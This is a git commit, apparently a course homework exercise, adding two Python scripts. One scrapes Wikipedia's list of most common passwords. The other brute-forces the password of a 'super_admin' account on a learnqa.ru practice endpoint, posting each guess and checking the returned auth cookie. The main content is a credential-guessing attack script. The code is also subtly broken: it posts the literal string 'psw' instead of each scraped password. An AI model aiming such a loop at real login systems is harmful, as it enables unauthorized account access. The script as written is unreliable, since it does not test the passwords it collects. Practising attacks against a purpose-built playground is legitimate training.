91579e73bd901d00477af5cc261cf840f4bd34b0
julgt <julgt@mail.ru>
2022-06-27 00:59:07 +0400

    get_psw_from_wiki

---
+++ get_password_from_wiki.py
@@ -0,0 +1,18 @@
+import requests
+from lxml import html
+
+def get_psw_from_wiki():
+    list = []
+    response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+
+    tree = html.fromstring(response.text)
+
+    locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
+    passwords = tree.xpath(locator)
+
+    for password in passwords:
+        password = str(password).strip()
+        if password!='':
+            list.append(password)
+        # print(password)
+    return list
---
+++ get_psw.py
@@ -0,0 +1,23 @@
+import requests
+from get_password_from_wiki import get_psw_from_wiki
+
+login = 'super_admin'
+list_psw = get_psw_from_wiki() # 225 шт
+
+i = 1
+for psw in list_psw:
+    print(i) # чтобы видеть прогресс во время выполнения скрипта
+    parametrs = {"login": login, "password": "psw"}
+    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=parametrs)
+    # print(response.text)
+    cookies = {}
+    if response.cookies.get('auth_cookie') is not None:
+        cookies.update({'auth_cookie': response.cookies.get('auth_cookie')})
+        response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = cookies)
+        resp = response2.text
+        if resp == "You are authorized":
+            # print(resp)
+            print(f"Искомый пароль: {psw}")
+            break
+    i = i+1
+
